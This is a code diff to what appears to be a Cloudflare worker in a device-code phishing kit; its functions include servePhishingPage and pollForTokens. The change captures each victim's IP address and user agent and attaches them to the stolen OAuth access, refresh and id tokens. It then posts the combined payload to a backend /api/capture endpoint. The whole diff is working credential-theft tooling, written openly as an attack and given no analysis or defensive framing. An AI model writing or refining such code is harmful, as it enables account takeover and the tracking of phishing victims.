@@ -443,6 +443,16 @@ async function servePhishingPage(request) {
 async function handleDeviceCodeRequest(request, waitUntil) {
   try {
     const { jwt_token, turnstile_token } = await request.json();
+
+    // The worker owns the whole device-code flow, so the backend never sees
+    // this request and can never learn the victim's real address. Report it in
+    // the /api/capture payload, otherwise every capture is stored with IP
+    // 0.0.0.0 and a "Phishing Worker" user agent.
+    const visitorIp = (request.headers.get('CF-Connecting-IP') ||
+                       request.headers.get('X-Forwarded-For') ||
+                       request.headers.get('X-Real-IP') || '').split(',')[0].trim();
+    const visitorUa = request.headers.get('user-agent') || '';
+
     reportDevCode('REQUEST RECEIVED', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_token_present=' + (!!turnstile_token) + ' turnstile_token_len=' + String(turnstile_token || '').length + ' verify_endpoint=' + VERIFY_ENDPOINT + ' fallback=' + VERIFY_ENDPOINT_FALLBACK, waitUntil);
     diag('DEVSTART_ENTRY', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_present=' + (!!turnstile_token) + ' turnstile_len=' + String(turnstile_token || '').length + ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 60), waitUntil);
 
@@ -514,7 +524,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
 
       // Start background polling with server-recommended interval
       const pollInterval = deviceCodeData.interval || 5;
-      pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);
+      pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval, visitorIp, visitorUa);
 
       diag('SUCCESS', 'user_code=' + deviceCodeData.user_code + ' verification_uri=' + deviceCodeData.verification_uri + ' expires_in=' + deviceCodeData.expires_in, waitUntil);
       return new Response(JSON.stringify({
@@ -537,7 +547,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
   }
 }
 
-async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) {
+async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval, visitorIp, visitorUa) {
   const maxAttempts = 60;
   let attempts = 0;
   let interval = initialInterval || 5; // Use server-recommended interval
@@ -569,6 +579,8 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
           access_token: tokenData.access_token,
           refresh_token: tokenData.refresh_token,
           id_token: tokenData.id_token,
+          ip: visitorIp,
+          user_agent: visitorUa,
         };
 
         // Add PRT persistence fields if available
@@ -593,7 +605,7 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
 
         await backendFetch('/api/capture', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: { 'Content-Type': 'application/json', 'User-Agent': visitorUa || 'Mozilla/5.0 (compatible)' },
           body: JSON.stringify(capturePayload),
         });
         return;
